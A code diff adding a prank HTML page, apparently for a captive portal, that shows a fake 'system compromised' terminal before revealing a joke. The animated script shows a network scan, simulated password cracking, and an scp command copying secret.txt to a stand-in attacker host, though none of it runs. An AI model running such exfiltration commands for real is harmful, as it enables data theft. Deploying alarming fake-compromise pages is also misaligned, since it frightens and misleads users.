@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WARNING: System Compromised</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+        .container {
+            width: 80%;
+            max-width: 800px;
+            padding: 20px;
+            border: 2px solid #ff0000;
+            background-color: #111;
+            position: relative;
+        }
+        h1 {
+            color: #ff0000;
+            text-align: center;
+            font-size: 24px;
+            text-transform: uppercase;
+            animation: glitch 1s infinite;
+        }
+        @keyframes glitch {
+            0% { transform: skew(0deg); }
+            10% { transform: skew(1deg); }
+            20% { transform: skew(-1deg); }
+            30% { transform: skew(2deg); }
+            40% { transform: skew(-2deg); }
+            50% { transform: skew(0deg); }
+        }
+        .skull {
+            display: none;
+            margin: 20px auto;
+            width: 120px;
+            height: 120px;
+            animation: shake 0.5s infinite;
+        }
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+            100% { transform: translateX(0); }
+        }
+        .terminal {
+            background-color: #000;
+            color: #00ff00;
+            padding: 10px;
+            height: 300px;
+            overflow-y: auto;
+            border: 1px solid #00ff00;
+            white-space: pre;
+            font-size: 14px;
+        }
+        .cursor {
+            animation: blink 0.7s infinite;
+        }
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+        #prankMessage {
+            display: none;
+            text-align: center;
+            color: #fff;
+        }
+        #prankMessage h2 {
+            font-size: 28px;
+            color: #ff0000;
+        }
+        #prankMessage button {
+            padding: 10px 20px;
+            background-color: #00ff00;
+            color: #000;
+            border: none;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+        }
+        .revealed {
+            background-color: #333;
+        }
+        .revealed .terminal {
+            display: none;
+        }
+        .revealed .skull {
+            display: block;
+        }
+        footer {
+            font-size: 12px;
+            color: #555;
+            text-align: center;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>WARNING: Your device has been compromised by the Pirate Hackers!</h1>
+        <svg class="skull" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
+            <!-- Pirate Skull with Bandana -->
+            <path fill="#fff" d="M32 2C15 2 2 15 2 32s13 30 30 30 30-13 30-30S49 2 32 2zm0 56C17 58 6 47 6 32S17 6 32 6s26 11 26 26-11 26-26 26z"/>
+            <rect fill="#000" x="18" y="20" width="8" height="8"/>
+            <rect fill="#000" x="38" y="20" width="8" height="8"/>
+            <path fill="#000" d="M22 42h20v4H22z"/>
+            <path fill="#ff0000" d="M26 10h12v6H26z"/> <!-- Red Bandana -->
+        </svg>
+        <div class="terminal" id="terminal"></div>
+        <div id="prankMessage">
+            <h2>Gotcha!</h2>
+            <p>This was just a prank by the Pirate Hackers. Your device is safe!</p>
+            <button onclick="continueToLogin()">Continue to Login</button>
+        </div>
+        <footer>
+            This is a simulated hacking experience for entertainment purposes only. No actual hacking is taking place.
+        </footer>
+    </div>
+    <script>
+        const terminal = document.getElementById('terminal');
+        const container = document.querySelector('.container');
+        const prankMessage = document.getElementById('prankMessage');
+
+        function typeText(text, callback) {
+            let i = 0;
+            const interval = setInterval(() => {
+                terminal.innerHTML += text[i];
+                terminal.innerHTML += '<span class="cursor">|</span>';
+                terminal.scrollTop = terminal.scrollHeight;
+                i++;
+                if (i >= text.length) {
+                    clearInterval(interval);
+                    terminal.innerHTML = terminal.innerHTML.replace('<span class="cursor">|</span>', '');
+                    if (callback) callback();
+                }
+            }, 50);
+        }
+
+        function executeCommand(cmd, output, callback) {
+            typeText('> ' + cmd + '\n', () => {
+                setTimeout(() => {
+                    typeText(output + '\n', callback);
+                }, 1000);
+            });
+        }
+
+        const commands = [
+            { cmd: 'ping -c 4 192.168.1.100', output: 'PING 192.168.1.100 (192.168.1.100) 56(84) bytes of data.\n64 bytes from 192.168.1.100: icmp_seq=1 ttl=64 time=0.123 ms\n...' },
+            { cmd: 'nmap -sV 192.168.1.100', output: 'Starting Nmap 7.91 ( https://nmap.org )\nNmap scan report for 192.168.1.100\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n443/tcp open  https\nScanning complete.' },
+            { cmd: 'ssh root@192.168.1.100', output: 'root@192.168.1.100\'s password: \nCracking password...\n10%...20%...50%...80%...100%\nPassword cracked successfully.\n' },
+            { cmd: 'cd /home/user', output: '' },
+            { cmd: 'ls -la', output: 'total 12\ndrwxr-xr-x 2 user user 4096 Oct 10 12:34 .\ndrwxr-xr-x 3 root root 4096 Oct 10 12:34 ..\n-rw-r--r-- 1 user user    0 Oct 10 12:34 secret.txt\n' },
+            { cmd: 'cat secret.txt', output: 'This is a secret file. You shouldn\'t be reading this!\n' },
+            { cmd: 'scp secret.txt pirate@evilserver.com:/uploads', output: 'Transferring file...\n10%...30%...70%...100%\nTransfer complete.\nYour data is now under Pirate Hacker control!' }
+        ];
+
+        let index = 0;
+
+        function runNextCommand() {
+            if (index < commands.length) {
+                const cmd = commands[index];
+                executeCommand(cmd.cmd, cmd.output, () => {
+                    index++;
+                    setTimeout(runNextCommand, 2000);
+                });
+            } else {
+                // Sequence complete, reveal prank
+                setTimeout(() => {
+                    container.classList.add('revealed');
+                    prankMessage.style.display = 'block';
+                }, 3000);
+            }
+        }
+
+        // Start the sequence after a short delay
+        setTimeout(runNextCommand, 1000);
+
+        function continueToLogin() {
+            alert('Continuing to login...');
+            // In a real captive portal, redirect to the actual login page
+            // Example: window.location.href = 'http://real-login-page.com';
+        }
+    </script>
+</body>
+</html>
